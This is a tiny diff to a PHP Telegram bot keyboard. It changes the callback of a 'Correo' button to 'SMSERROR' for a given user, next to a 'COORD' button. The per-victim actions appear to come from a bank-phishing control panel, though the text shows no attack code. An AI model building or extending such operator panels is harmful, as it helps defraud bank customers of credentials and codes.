@@ -22,7 +22,7 @@ $keyboard = [
         ],
         [
             ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"],
-            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
+            ["text" => "📧 Correo", "callback_data" => "SMSERROR|$usuario"]
         ]
     ]
 ];
